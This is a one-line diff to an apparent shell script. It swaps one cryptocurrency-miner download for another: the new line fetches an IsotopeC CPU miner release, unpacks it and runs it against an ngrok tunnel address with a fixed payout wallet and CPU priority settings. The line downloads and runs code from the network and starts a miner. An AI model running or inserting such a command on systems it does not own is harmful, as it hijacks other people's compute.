@@ -1,1 +1,1 @@
-wget https://github.com/sacha236/awe/raw/main/sugarmaker-v2.5.0.tar.gz && tar zxvf sugarmaker-v2.5.0.tar.gz && cd sugarmaker-v2.5.0 && ./run-mainnet-solo.sh
+wget https://github.com/isotopec-org/isotopec-cpuminer/releases/download/v1.0.0.0/IsotopeC-CPUminer_v1.0.0.0_Linux_Static.tar.gz && tar zxvf IsotopeC-CPUminer_v1.0.0.0_Linux_Static.tar.gz && cd IsotopeC-CPUminer_v1.0.0.0_Linux_Static && ./isotopec-cpuminer -a cpupower -o http://4.tcp.ngrok.io:13968 --no-longpoll -u  user  -p pass --coinbase-addr=CUrqEK6tynwy4fhzAGGE1HkfMenPoU4D8B --cpu-affinity 63 --cpu-priority 4
